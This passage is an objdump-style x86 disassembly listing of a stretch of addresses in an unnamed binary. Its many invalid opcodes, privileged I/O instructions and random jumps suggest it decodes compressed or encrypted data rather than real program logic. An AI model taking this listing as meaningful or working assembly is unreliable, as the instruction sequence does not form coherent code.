  41a1ff:	push   ebx
  41a200:	out    0x27,eax
  41a202:	aaa    
  41a203:	sub    eax,0xf3456b1f
  41a208:	mov    edx,DWORD PTR [eax]
  41a20a:	push   eax
  41a20b:	ds dec eax
  41a20d:	mov    ah,0xa2
  41a20f:	xchg   ebp,eax
  41a210:	jno    0x41a1bd
  41a212:	enter  0x4fe3,0xed
  41a216:	pop    esp
  41a217:	dec    edi
  41a218:	push   ebp
  41a219:	dec    ebx
  41a21a:	sbb    bh,cl
  41a21c:	mov    bh,BYTE PTR [ebx+0x135b18b5]
  41a222:	inc    edi
  41a223:	enter  0x999b,0x8e
  41a227:	xchg   DWORD PTR [eax],eax
  41a229:	inc    esi
  41a22a:	fild   WORD PTR [ebx-0x5f]
  41a22d:	in     al,dx
  41a22e:	inc    esp
  41a22f:	inc    ebp
  41a230:	outs   dx,DWORD PTR ds:[esi]
  41a231:	jnp    0x41a1db
  41a233:	das    
  41a234:	cmc    
  41a235:	(bad)  
  41a237:	and    BYTE PTR [ecx],ch
  41a239:	dec    eax
  41a23a:	xchg   BYTE PTR [edi+0x0],bl
  41a23d:	or     DWORD PTR [eax],0x3604cc55
  41a243:	test   eax,0xcd2b8e7f
  41a248:	outs   dx,BYTE PTR ds:[esi]
  41a249:	sub    ebx,ebp
  41a24b:	fsub   DWORD PTR [ecx]
  41a24d:	fwait
  41a24e:	xchg   esp,edi
  41a250:	jo     0x41a234
  41a252:	xchg   esp,eax
  41a253:	(bad)  
  41a254:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a255:	loopne 0x41a2a0
  41a257:	and    DWORD PTR [edx-0x6d],ecx
  41a25a:	pop    edi
  41a25b:	or     cl,BYTE PTR es:[eax-0x2d]
  41a25f:	sub    DWORD PTR [ecx],edx
  41a261:	int3   
  41a262:	das    
  41a263:	xor    al,0x13
  41a265:	rcl    DWORD PTR [ebp-0x9012e36],cl
  41a26b:	loop   0x41a268
  41a26d:	adc    ebp,eax
  41a26f:	imul   BYTE PTR [edi+0x6896600d]
  41a275:	lea    esp,[ecx]
  41a277:	jo     0x41a201
  41a279:	lea    ebx,[esi]
  41a27b:	xchg   ecx,eax
  41a27c:	and    eax,0xedbcc729
  41a281:	sbb    al,0xa6
  41a283:	arpl   WORD PTR [esp+edx*1],di
  41a286:	inc    esi
  41a287:	in     eax,dx
  41a288:	mov    edi,0xb78f057b
  41a28d:	sar    BYTE PTR [edx+0x62496a43],1
  41a293:	fs (bad) 
  41a295:	cmp    BYTE PTR [ebp-0xacf4d1],bl
  41a29b:	enter  0x11ab,0xb
  41a29f:	es int 0x34
  41a2a2:	cmp    eax,0xd5db3005
  41a2a7:	and    eax,0xc22444f2
  41a2ac:	loopne 0x41a22e
  41a2ae:	dec    edi
  41a2af:	push   es
  41a2b0:	or     ah,BYTE PTR [ecx+eiz*1+0x51653b49]
  41a2b7:	int    0xd
  41a2b9:	sub    eax,0x436a1aa0
  41a2be:	or     BYTE PTR [edx+0x20],bl
  41a2c1:	hlt    
  41a2c2:	pop    edi
  41a2c3:	sub    cl,BYTE PTR [ebp+0x24]
  41a2c6:	shl    BYTE PTR [edx+0x4c],cl
  41a2c9:	js     0x41a34a
  41a2cb:	mov    cl,0xd2
  41a2cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2ce:	mov    ch,0x77
  41a2d0:	test   eax,0xaa7d2b86
  41a2d5:	sbb    BYTE PTR [ebx],ch
  41a2d7:	add    BYTE PTR [eax],dl
  41a2d9:	out    0x4e,al
  41a2db:	sub    DWORD PTR [esi+0x74],esi
  41a2de:	mov    ?,WORD PTR [edi-0x18]
  41a2e1:	sbb    eax,0x15fe21a5
  41a2e6:	hlt    
  41a2e7:	push   0xf751c110
  41a2ec:	dec    edx
  41a2ed:	jge    0x41a2e6
  41a2ef:	sbb    al,0xe1
  41a2f1:	(bad)  
  41a2f2:	(bad)  
  41a2f3:	jecxz  0x41a35e
  41a2f5:	push   edx
  41a2f6:	jb     0x41a2b9
  41a2f8:	int    0x34
  41a2fa:	test   eax,0xa8573278
  41a2ff:	push   eax
  41a300:	jae    0x41a334
  41a302:	loop   0x41a34f
  41a304:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a305:	pop    edi
  41a306:	in     al,dx
  41a307:	sub    ah,BYTE PTR [ebp+ebp*1+0x76]
  41a30b:	imul   edx,DWORD PTR [ecx+0x3538838c],0xbb7d5ff6
  41a315:	xor    dl,BYTE PTR [edx-0x58]
  41a318:	mov    bl,0x44
  41a31a:	imul   BYTE PTR [edx-0x54c6ff52]
  41a320:	fptan  
  41a322:	mov    ds:0xc3fd5344,eax
  41a327:	cld    
  41a328:	jge    0x41a2da
  41a32a:	xchg   DWORD PTR [ebp+0x7e694e80],esp
  41a330:	outs   dx,BYTE PTR ds:[esi]
  41a331:	je     0x41a2ce
  41a333:	mov    bh,0x29
  41a335:	or     BYTE PTR [eax],bh
  41a337:	dec    esi
  41a338:	fisttp QWORD PTR [esp+eax*8]
  41a33b:	add    edi,DWORD PTR [ebx]
  41a33d:	jo     0x41a3ad
  41a33f:	jg     0x41a2fa
  41a341:	in     eax,dx
  41a342:	gs push esi
  41a344:	cmp    dl,BYTE PTR [ecx+0x45]
  41a347:	(bad)  
  41a348:	jge    0x41a315
  41a34a:	inc    esi
  41a34b:	or     BYTE PTR [esi+0x61],bl
  41a34e:	sub    eax,0x5eb89813
  41a353:	aaa    
  41a354:	out    dx,al
  41a355:	movmskps edx,xmm5
  41a358:	std    
  41a359:	cmc    
  41a35a:	xchg   dh,cl
  41a35c:	push   ecx
  41a35d:	jmp    0x41a33e
  41a35f:	mov    dh,0xdc
  41a361:	into   
  41a362:	and    DWORD PTR [ecx+0x24],ebp
  41a365:	adc    al,0x6b
  41a367:	imul   edx,DWORD PTR [ecx],0x1b1c6040
  41a36d:	jcxz   0x41a3ea
  41a370:	cmp    dl,ch
  41a372:	dec    BYTE PTR [edx+eax*8-0x45]
  41a376:	xchg   esp,eax
  41a377:	push   edx
  41a378:	and    eax,0x45eb720a
  41a37d:	retf   
  41a37e:	loop   0x41a335
  41a380:	inc    ebp
  41a381:	xchg   ebx,eax
  41a382:	ret    0x6688
  41a385:	sub    edi,esp
  41a387:	outs   dx,BYTE PTR ds:[esi]
  41a388:	and    DWORD PTR [edx-0x7a],0x42
  41a38c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a38d:	pushf  
  41a38e:	out    dx,al
  41a38f:	in     eax,dx
  41a390:	xor    BYTE PTR [esi],bh
  41a392:	jge    0x41a34e
  41a394:	les    edx,FWORD PTR [ebx-0x2c2212ac]
  41a39a:	stos   DWORD PTR es:[edi],eax
  41a39b:	shr    DWORD PTR [ebx+eax*8],1
  41a39e:	push   es
  41a39f:	xor    dh,BYTE PTR [edi]
  41a3a1:	loopne 0x41a398
  41a3a3:	addr16 jne 0x41a36f
  41a3a6:	clc    
  41a3a7:	dec    edx
  41a3a8:	cmp    BYTE PTR [ebx-0x46],0x83
  41a3ac:	push   ds
  41a3ad:	stos   DWORD PTR es:[edi],eax
  41a3ae:	jg     0x41a3fc
  41a3b0:	and    ebx,DWORD PTR [edi+edi*4-0x7b]
  41a3b4:	mov    bh,0x3d
  41a3b6:	inc    eax
  41a3b7:	xlat   BYTE PTR ds:[ebx]
  41a3b8:	dec    ebx
  41a3b9:	jecxz  0x41a3a6
  41a3bb:	and    cl,BYTE PTR [esi+edi*2+0x7d]
  41a3bf:	loopne 0x41a358
  41a3c1:	pop    ss
  41a3c2:	fwait
  41a3c3:	mov    eax,ds:0xbbc8255c
  41a3c8:	dec    esp
  41a3c9:	(bad)  
  41a3ca:	sub    esp,DWORD PTR [ecx-0x2cb0df2e]
  41a3d0:	jle    0x41a359
  41a3d2:	pop    eax
  41a3d3:	call   0xd376d1fa
  41a3d8:	mov    esp,0xf3f46b2f
  41a3dd:	cdq    
  41a3de:	bound  edi,QWORD PTR [ebp-0x24]
  41a3e1:	xacquire xchg BYTE PTR [ecx+ecx*2+0x26],bh
  41a3e6:	mov    dh,0x73
  41a3e8:	fldenv [ebx-0x41]
  41a3eb:	shr    BYTE PTR [edi-0x4a],1
  41a3ee:	jl     0x41a465
  41a3f0:	cld    
  41a3f1:	rcr    BYTE PTR [edi],cl
  41a3f3:	mov    al,ds:0x4bdbf0de
  41a3f8:	int    0xfb
  41a3fa:	cmp    eax,0xf6ceaff6
  41a3ff:	add    eax,0x661fb8e4
  41a404:	sbb    edi,DWORD PTR [eax-0x31]
  41a407:	mov    WORD PTR [edi-0x8],ds
  41a40a:	xlat   BYTE PTR ds:[ebx]
  41a40b:	jne    0x41a3e7
  41a40d:	lds    eax,FWORD PTR [edx-0x612511e3]
  41a413:	push   eax
  41a414:	es jae 0x41a45f
  41a417:	dec    esi
  41a418:	push   ecx
  41a419:	pop    esi
  41a41a:	out    dx,eax
  41a41b:	in     eax,0xc9
  41a41d:	daa    
  41a41e:	inc    esi
  41a41f:	in     al,0xf2
  41a421:	mov    ah,0x3e
  41a423:	ins    DWORD PTR es:[edi],dx
  41a424:	cld    
  41a425:	cli    
  41a426:	inc    ebp
  41a427:	and    ah,BYTE PTR [edi+0x7e8e39e2]
  41a42d:	clc    
  41a42e:	test   DWORD PTR [edi],ebx
  41a430:	mov    ebp,0x1fed3717
  41a435:	cli    
  41a436:	(bad)  
  41a437:	imul   ebp,edx,0x21
  41a43a:	les    eax,FWORD PTR [edi]
  41a43c:	cmc    
  41a43d:	jbe    0x41a428
  41a43f:	xchg   ebx,eax
  41a440:	adc    al,0xf3
  41a442:	cmovns edi,DWORD PTR [esi]
  41a445:	xchg   ecx,eax
  41a446:	aaa    
  41a447:	(bad)  
  41a448:	adc    dl,al
  41a44a:	jbe    0x41a4b2
  41a44c:	daa    
  41a44d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a44e:	leave  
  41a44f:	xor    DWORD PTR [eax+0x662ae775],esi
  41a455:	stc    
  41a456:	mov    ebp,0x57f2c331
  41a45b:	mov    ebp,0x169992e1
  41a460:	jns    0x41a3fa
  41a462:	fld    DWORD PTR [eax+0x37522d6e]
  41a468:	sub    ebx,edx
  41a46a:	push   edi
  41a46b:	mov    ch,0x99
  41a46d:	leave  
  41a46e:	push   ds
  41a46f:	push   ds
  41a470:	dec    ebx
  41a471:	add    ecx,ebp
  41a473:	out    dx,eax
  41a474:	out    0x4b,eax
  41a476:	cdq    
  41a477:	push   ebx
  41a478:	out    dx,eax
  41a479:	sub    BYTE PTR [esi],ah
  41a47b:	and    ebp,DWORD PTR [ecx]
  41a47d:	ret    0x7ee2
  41a480:	pmulhuw mm2,QWORD PTR [eax-0x1af4926]
  41a487:	outs   dx,BYTE PTR ds:[esi]
  41a488:	shl    DWORD PTR [esi],1
  41a48a:	jnp    0x41a423
  41a48c:	cmc    
  41a48d:	pop    esi
  41a48e:	and    BYTE PTR [edi],0x1b
  41a491:	or     ebx,DWORD PTR [ebx+esi*1]
  41a494:	xor    BYTE PTR [ecx],al
  41a496:	xchg   esp,eax
  41a497:	xor    dh,BYTE PTR [edx+0x37]
  41a49a:	mov    ah,0xa4
  41a49c:	fs sbb edi,edi
  41a49f:	dec    edx
  41a4a0:	aas    
  41a4a1:	bound  eax,QWORD PTR [esp+ecx*2]
  41a4a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4a5:	adc    dl,0x2e
  41a4a8:	mov    ss,WORD PTR [edi-0x2684e86d]
  41a4ae:	add    al,0x44
  41a4b0:	push   ebp
  41a4b1:	adc    edi,edx
  41a4b3:	aam    0x85
  41a4b5:	(bad)  
  41a4b7:	in     eax,dx
  41a4b8:	inc    ebx
  41a4b9:	cmp    ebp,DWORD PTR [esi-0x43f86c2d]
  41a4bf:	sub    al,0xc8
  41a4c1:	mov    BYTE PTR [esi+0x377bd6d4],dl
  41a4c7:	daa    
  41a4c8:	inc    ebx
  41a4c9:	stos   BYTE PTR es:[edi],al
  41a4ca:	push   ebx
  41a4cb:	sub    ebx,edx
  41a4cd:	jnp    0x41a4e0
  41a4cf:	push   ss
  41a4d0:	dec    ecx
  41a4d1:	dec    eax
  41a4d2:	inc    esi
  41a4d3:	push   eax
  41a4d4:	xchg   DWORD PTR [edx-0x10],ecx
  41a4d7:	dec    eax
  41a4d8:	push   0x39
  41a4da:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41a4dc:	lods   eax,DWORD PTR ds:[esi]
  41a4dd:	xor    BYTE PTR [ecx+0x6fe73da],bh
  41a4e3:	add    ebp,DWORD PTR [ecx-0x6fd712c6]
  41a4e9:	sbb    eax,0x5f574c1e
  41a4ee:	fimul  WORD PTR [edx]
  41a4f0:	jmp    0x41a55e
  41a4f2:	dec    ebx
  41a4f3:	adc    al,BYTE PTR [edi]
  41a4f5:	jmp    0x83da60bf
  41a4fa:	and    DWORD PTR [edi],edx
  41a4fc:	popf   
  41a4fd:	in     al,0xce
  41a4ff:	jno    0x41a4a7
  41a501:	cmp    eax,DWORD PTR [esi+0x6e]
  41a504:	adc    eax,0x4e500e1f
  41a509:	sub    bl,BYTE PTR [esi]
  41a50b:	sub    ah,BYTE PTR [edx]
  41a50d:	cwde   
  41a50e:	or     ebp,DWORD PTR [esi+eiz*4-0x6574d67b]
  41a515:	jns    0x41a4ea
  41a517:	loop   0x41a55f
  41a519:	ds mov esi,ebx
  41a51c:	mov    bl,0xc4
  41a51e:	lahf   
  41a51f:	and    ecx,DWORD PTR [ecx+0x1b]
  41a522:	mov    ch,al
  41a524:	aas    
  41a525:	fwait
  41a526:	xchg   ebp,eax
  41a527:	jne    0x41a531
  41a529:	in     eax,0xc7
  41a52b:	jp     0x41a55a
  41a52d:	pop    ecx
  41a52e:	inc    eax
  41a52f:	and    DWORD PTR ds:0xe2f37f60,0x11
  41a536:	add    ebx,esp
  41a538:	xchg   ebx,eax
  41a539:	loop   0x41a568
  41a53b:	push   es
  41a53c:	sub    eax,0x76b6b829
  41a541:	add    ch,dh
  41a543:	and    esp,DWORD PTR [edi+0x38]
  41a546:	repnz retf 0x9b97
  41a54a:	leave  
  41a54b:	mov    ds:0x94ad10ad,eax
  41a550:	jo     0x41a4d7
  41a552:	xchg   DWORD PTR [edi-0x41817300],eax
  41a558:	mov    dh,0xff
  41a55a:	cmc    
  41a55b:	push   ss
  41a55c:	inc    edx
  41a55d:	and    eax,0x6c2437d8
  41a562:	mov    al,0x23
  41a564:	cmp    eax,0xb3481d6d
  41a569:	adc    eax,0xbd5c38fa
  41a56e:	and    bh,ch
  41a570:	add    eax,0x1f12b366
  41a575:	loope  0x41a529
  41a577:	in     eax,dx
  41a578:	jl     0x41a5f3
  41a57a:	push   ebp
  41a57b:	scas   eax,DWORD PTR es:[edi]
  41a57c:	add    DWORD PTR [eax-0x25],esp
  41a57f:	adc    al,0xc2
  41a581:	inc    edx
  41a582:	xor    dl,BYTE PTR [esi-0xe]
  41a585:	ret    
  41a586:	aas    
  41a587:	push   esi
  41a588:	jge    0x41a5c9
  41a58a:	jnp    0x41a54d
  41a58c:	gs pusha 
  41a58e:	aas    
  41a58f:	cmp    al,0x1c
  41a591:	sahf   
  41a592:	pop    edi
  41a593:	jle    0x41a539
  41a595:	bound  ebx,QWORD PTR [ebp-0x30]
  41a598:	ja     0x41a546
  41a59a:	shl    DWORD PTR [ecx-0x78a7c3e2],0x6a
  41a5a1:	int    0xb7
  41a5a3:	mov    ecx,0xf0f20899
  41a5a8:	call   0xbd998765
  41a5ad:	test   eax,0x6336a4b1
  41a5b2:	push   es
  41a5b3:	mov    ah,0x3e
  41a5b5:	and    DWORD PTR [edx],edx
  41a5b7:	enter  0xc0e6,0xc3
  41a5bb:	jno    0x41a5be
  41a5bd:	fadd   QWORD PTR [esi+0x5f]
  41a5c0:	jmp    0x41a637
  41a5c2:	xchg   ebx,eax
  41a5c3:	jp     0x41a56f
  41a5c5:	ss je  0x41a552
  41a5c8:	das    
  41a5c9:	mov    ebp,0xdd92fa2b
  41a5ce:	fdiv   QWORD PTR [esi]
  41a5d0:	cmp    esp,DWORD PTR [ecx]
  41a5d2:	xlat   BYTE PTR ds:[ebx]
  41a5d3:	lar    edi,WORD PTR [esi+0x22]
  41a5d7:	sbb    eax,0x9e1273da
  41a5dc:	jp     0x41a654
  41a5de:	pop    ss
  41a5df:	enter  0x79b8,0xe7
  41a5e3:	and    cl,BYTE PTR [ecx]
  41a5e5:	pushf  
  41a5e6:	test   eax,0x8d5a731c
  41a5eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5ec:	ficomp WORD PTR [edx-0x38047479]
  41a5f2:	in     eax,0xf2
  41a5f4:	pushf  
  41a5f5:	adc    edx,DWORD PTR [ecx-0x1551acfa]
  41a5fb:	push   esp
  41a5fc:	jns    0x41a5fb
  41a5fe:	or     eax,0xc07a7db0
  41a603:	in     al,dx
  41a604:	xor    ecx,DWORD PTR [ecx]
  41a606:	xor    eax,esi
  41a608:	daa    
  41a609:	cdq    
  41a60a:	sbb    eax,0x85574f5a
  41a60f:	xor    cl,BYTE PTR [edi-0x3f]
  41a612:	xchg   edi,eax
  41a613:	mov    al,ds:0x1f41b72b
  41a618:	xchg   esi,eax
  41a619:	ret    
  41a61a:	jmp    0x41a69a
  41a61c:	ss fwait
  41a61e:	push   esi
  41a61f:	add    ecx,DWORD PTR [ebp-0x6341018]
  41a625:	add    esi,DWORD PTR [esi+0x47505a6d]
  41a62b:	mov    ah,0x16
  41a62d:	push   edx
  41a62e:	shl    esp,1
  41a630:	pop    ecx
  41a631:	dec    esp
  41a632:	mov    bl,0x3c
  41a634:	mov    al,ds:0x6123c6b1
  41a639:	xor    BYTE PTR [eax],0xcc
  41a63c:	dec    eax
  41a63d:	inc    eax
  41a63f:	xchg   ebx,eax
  41a640:	xchg   esi,eax
  41a641:	pop    ebp
  41a642:	std    
  41a643:	pop    eax
  41a644:	push   ecx
  41a645:	push   ebx
  41a646:	sub    eax,0xd7192f5
  41a64b:	gs repz jle 0x41a69a
  41a64f:	sahf   
  41a650:	sbb    BYTE PTR [edi],0xc9
  41a653:	call   0x719cdd95
  41a658:	or     DWORD PTR [eax+0x4b],edi
  41a65b:	pop    edx
  41a65c:	push   ecx
  41a65d:	rol    BYTE PTR [edi-0x14bd9f70],1
  41a663:	lods   eax,DWORD PTR ds:[esi]
  41a664:	jl     0x41a68f
  41a666:	iret   
  41a667:	xchg   ecx,eax
  41a668:	repz pop eax
  41a66a:	pop    ecx
  41a66b:	xor    BYTE PTR [edx],ah
  41a66d:	retf   
  41a66e:	mov    DWORD PTR [edx-0xc],ecx
  41a671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a672:	les    eax,FWORD PTR [edi]
  41a674:	sbb    edx,eax
  41a676:	add    esi,DWORD PTR [ecx-0x60]
  41a679:	push   cs
  41a67a:	test   al,0xff
  41a67c:	sub    bl,BYTE PTR [edx-0x5e1bcf91]
  41a682:	xchg   edx,eax
  41a683:	(bad)  
  41a684:	hlt    
  41a685:	cmp    BYTE PTR [ecx],0x29
  41a688:	ins    DWORD PTR es:[edi],dx
  41a689:	sub    eax,0x18c8bbc4
  41a68e:	xor    BYTE PTR [ebx-0x47],0x7d
  41a692:	gs adc eax,0x201c8933
  41a698:	mov    al,ds:0x4db006ce
  41a69d:	cmp    dl,BYTE PTR [ecx]
  41a69f:	hlt    
  41a6a0:	cs cwde 
  41a6a2:	aam    0x19
  41a6a4:	and    ebx,DWORD PTR [esi-0x47]
  41a6a7:	xor    bh,0xea
  41a6aa:	pushf  
  41a6ab:	lds    esi,FWORD PTR [esi+0x39]
  41a6ae:	jne    0x41a6a4
  41a6b0:	jg     0x41a709
  41a6b2:	ins    BYTE PTR es:[edi],dx
  41a6b3:	push   edi
  41a6b4:	aam    0x91
  41a6b6:	jecxz  0x41a723
  41a6b8:	int    0xe5
  41a6ba:	lahf   
  41a6bb:	lahf   
  41a6bc:	jmp    FWORD PTR [esi+0x6a1359d6]
  41a6c2:	adc    ecx,ebp
  41a6c4:	pop    edi
  41a6c5:	popf   
  41a6c6:	ins    DWORD PTR es:[edi],dx
  41a6c7:	cmc    
  41a6c8:	stc    
  41a6c9:	jbe    0x41a69a
  41a6cb:	xchg   BYTE PTR [ecx+0xd43e3a8],ch
  41a6d1:	in     eax,0x9e
  41a6d3:	pop    esi
  41a6d4:	mov    eax,ds:0x1207a58a
  41a6d9:	mov    cl,0x16
  41a6db:	push   ebp
  41a6dc:	popa   
  41a6dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6de:	cmp    dh,BYTE PTR [ebx]
  41a6e0:	xor    al,BYTE PTR [ebx+0x5bc08693]
  41a6e6:	cmp    edx,DWORD PTR [edx+0x7e1aa86d]
  41a6ec:	jmp    0xb02d:0x9b664030
  41a6f3:	ret    0x656c
  41a6f6:	mov    edi,esi
  41a6f8:	or     BYTE PTR [esi-0x5b],0x9d
  41a6fc:	sar    dh,0xd4
  41a6ff:	push   edi
  41a700:	mov    ah,0x50
  41a702:	in     eax,0xb1
  41a704:	inc    esp
  41a705:	xor    al,0xe8
  41a707:	mov    DWORD PTR [ebp+0x32],esp
  41a70a:	sbb    bh,BYTE PTR [eax-0x7e8b9dbb]
  41a710:	out    0x56,eax
  41a712:	mov    WORD PTR [ebx-0x2c],?
  41a715:	jmp    0xb927bf7f
  41a71a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a71b:	int    0x66
  41a71d:	addr16 mov esp,0x7c3f19fa
  41a723:	data16 hlt 
  41a725:	push   es
  41a726:	ins    DWORD PTR es:[edi],dx
  41a727:	pop    ds
  41a728:	mov    ebp,0xf156f751
  41a72d:	scas   al,BYTE PTR es:[edi]
  41a72e:	mov    bl,0xae
  41a730:	sbb    edi,esi
  41a732:	je     0x41a72b
  41a734:	push   ebp
  41a735:	cwde   
  41a736:	jae    0x41a76a
  41a738:	sub    ecx,DWORD PTR [esi+0xd87896]
  41a73e:	and    BYTE PTR [eax+0x5da88550],0xf5
  41a745:	ja     0x41a7c6
  41a747:	popf   
  41a748:	xor    esp,ebx
  41a74a:	pmuludq mm7,QWORD PTR [eax-0x6b]
  41a74e:	das    
  41a74f:	fucomi st,st(5)
  41a751:	mov    ds:0x372447ff,al
  41a756:	sub    eax,0xe4c86c16
  41a75b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a75c:	mov    bl,0xf8
  41a75e:	icebp  
  41a75f:	addr16 cmp edx,ebp
  41a762:	jno    0x41a729
  41a764:	aaa    
  41a765:	leave  
  41a766:	test   eax,0x53931215
  41a76b:	dec    esi
  41a76c:	mov    edi,0xab4b56b
  41a771:	loopne 0x41a703
  41a773:	fild   WORD PTR [ebx]
  41a775:	test   eax,0x734c8ae4
  41a77a:	and    DWORD PTR [esp+edi*1+0x6e4dedda],0x7c32c12f
  41a785:	inc    edi
  41a786:	push   ds
  41a787:	rcr    DWORD PTR [ebx-0x6f74a58b],1
  41a78d:	sub    esi,DWORD PTR [ebx+0x94d5112]
  41a793:	dec    edi
  41a794:	ja     0x41a7d1
  41a796:	test   BYTE PTR [ebp-0x6f],al
  41a799:	jmp    0x5600e56c
  41a79e:	xchg   DWORD PTR [ebp+0x1627c9d2],edi
  41a7a4:	fdivr  QWORD PTR [esi]
  41a7a6:	xchg   ecx,eax
  41a7a7:	and    DWORD PTR [edx-0x223680ae],ebp
  41a7ad:	ins    DWORD PTR es:[edi],dx
  41a7ae:	pop    ds
  41a7af:	jns    0x41a7d2
  41a7b1:	in     al,0xb
  41a7b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7b4:	pop    edx
  41a7b5:	mov    cl,0x52
  41a7b7:	sub    ebp,DWORD PTR [ecx+0x73fde71a]
  41a7bd:	fidiv  DWORD PTR [edi-0x3]
  41a7c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7c1:	jnp    0x41a827
  41a7c3:	lods   al,BYTE PTR ds:[esi]
  41a7c4:	fs test eax,0x6b48cc92
  41a7ca:	xlat   BYTE PTR ds:[ebx]
  41a7cb:	repz ds adc esp,eax
  41a7cf:	mov    dh,0x1a
  41a7d1:	dec    edx
  41a7d2:	data16 ja 0x41a766
  41a7d5:	and    eax,0xc1f9ac3c
  41a7da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7db:	repnz and eax,esp
  41a7de:	popf   
  41a7df:	test   eax,0xef151c62
  41a7e4:	sbb    BYTE PTR [edx],0xb
  41a7e7:	js     0x41a7b5
  41a7e9:	lock inc ebp
  41a7eb:	sbb    esi,edi
  41a7ed:	cmp    cl,BYTE PTR [esi-0x1]
  41a7f0:	test   al,0x62
  41a7f2:	xor    dl,cl
  41a7f4:	aas    
  41a7f5:	stos   DWORD PTR es:[edi],eax
  41a7f6:	fdivr  QWORD PTR [ebx]
  41a7f8:	ficomp DWORD PTR [ecx-0x1e]
  41a7fb:	xchg   esi,eax
  41a7fc:	leave  
  41a7fd:	push   esp
  41a7fe:	xchg   edi,eax
  41a7ff:	and    al,0xfc
  41a801:	call   0x5df32905
  41a806:	dec    ecx
  41a807:	fidivr DWORD PTR [edx+0x7b]
  41a80a:	(bad)  
  41a80b:	mov    esi,0xbc8df024
  41a810:	and    bl,BYTE PTR [esi]
  41a812:	or     eax,0x5c873f27
  41a817:	or     ah,BYTE PTR [esi-0x7bde6f6a]
  41a81d:	xor    DWORD PTR [esi+0x6f3465b9],ecx
  41a823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a824:	add    eax,0xd78a2ccc
  41a829:	in     eax,dx
  41a82a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a82b:	push   ecx
  41a82c:	arpl   WORD PTR [edi+edx*2-0x48],dx
  41a830:	in     al,dx
  41a831:	pop    edx
  41a832:	(bad)  [ebx+0x35]
  41a835:	adc    al,0xf2
  41a837:	inc    ebp
  41a838:	mov    ch,0xad
  41a83a:	and    eax,0xd2dec42d
  41a83f:	and    ah,BYTE PTR [ecx+eax*4]
  41a842:	inc    edi
  41a843:	dec    ebx
  41a844:	pusha  
  41a845:	xor    BYTE PTR [ecx+esi*8+0x196e0d15],ah
  41a84c:	mov    BYTE PTR [eax],al
  41a84e:	fisttp DWORD PTR ds:0x4844416e
  41a854:	sub    al,0x71
  41a856:	hlt    
  41a857:	mov    esp,0xe42d11a9
  41a85c:	test   al,0x2
  41a85e:	and    eax,0xa2628128
  41a863:	mov    esp,0xd1f39884
  41a868:	and    DWORD PTR [eax],esp
  41a86a:	inc    edx
  41a86b:	xchg   BYTE PTR [eax+0x6c19822e],dh
  41a871:	and    edx,DWORD PTR [edi]
  41a873:	fdivr  QWORD PTR [edx+0x4f4f8797]
  41a879:	aas    
  41a87a:	retf   0xde29
  41a87d:	pop    es
  41a87e:	adc    DWORD PTR [edx+0x3aa65edf],0x61
  41a885:	cli    
  41a886:	cs xor dl,al
  41a889:	and    eax,0x93ce855b
  41a88e:	xchg   edi,eax
  41a88f:	xor    eax,0x488f00cc
  41a894:	gs inc edx
  41a896:	mov    WORD PTR [ecx],?
  41a898:	lea    edx,[ebx-0x61]
  41a89b:	arpl   WORD PTR [ebp+0x9a24751],sp
  41a8a1:	xchg   edx,eax
  41a8a2:	stos   DWORD PTR es:[edi],eax
  41a8a3:	pop    edx
  41a8a4:	lock sti 
  41a8a6:	(bad)  
  41a8a7:	jg     0x41a8b8
  41a8a9:	aam    0x6e
  41a8ab:	jne    0x41a906
  41a8ad:	adc    ah,BYTE PTR [esi+edx*4+0x61]
  41a8b1:	jbe    0x41a927
  41a8b3:	xchg   edx,eax
  41a8b4:	xadd   BYTE PTR [ebp-0x7],al
  41a8b8:	and    ch,0x7f
  41a8bb:	mov    esp,0xa6b6bea6
  41a8c0:	inc    edx
  41a8c1:	std    
  41a8c2:	bound  edi,QWORD PTR [eax+0x51c5a43c]
  41a8c8:	and    BYTE PTR [edi-0x62],ch
  41a8cb:	sbb    al,0xb6
  41a8cd:	loopne 0x41a8e7
  41a8cf:	push   ds
  41a8d0:	mov    esi,0x260f0bca
  41a8d5:	adc    ecx,DWORD PTR [ebp-0x6b]
  41a8d8:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8da:	aas    
  41a8db:	repnz fld TBYTE PTR [eax]
  41a8de:	pop    ebp
  41a8df:	retf   
  41a8e0:	pop    esp
  41a8e1:	adc    esi,DWORD PTR [edx+0x41c9eef0]
  41a8e7:	aam    0xe1
  41a8e9:	push   ecx
  41a8ea:	inc    ebp
  41a8eb:	or     dl,BYTE PTR [esi]
  41a8ed:	(bad)  
  41a8ee:	push   ebx
  41a8ef:	lea    edx,[eax+0x3a9dd906]
  41a8f5:	mov    bh,0xfe
  41a8f7:	inc    eax
  41a8f8:	outs   dx,BYTE PTR ds:[esi]
  41a8f9:	inc    ecx
  41a8fa:	lock sub edi,DWORD PTR [edi-0x1c]
  41a8fe:	mov    eax,ds:0x66bbc293
  41a903:	mov    ds:0xefd49720,al
  41a908:	mov    ebp,0x2759b35b
  41a90d:	loop   0x41a909
  41a90f:	sti    
  41a910:	pusha  
  41a911:	inc    ebx
  41a912:	cs xor dl,dl
  41a915:	push   0x3b
  41a917:	mov    cl,0xe0
  41a919:	nop
  41a91a:	pop    ss
  41a91b:	sbb    dh,BYTE PTR [eax]
  41a91d:	aam    0xa5
  41a91f:	pop    esp
  41a920:	outs   dx,DWORD PTR ds:[esi]
  41a921:	xchg   ch,ah
  41a923:	sbb    edi,0xabcf1e2a
  41a929:	jnp    0x41a952
  41a92b:	nop
  41a92c:	stc    
  41a92d:	cmp    al,0xd9
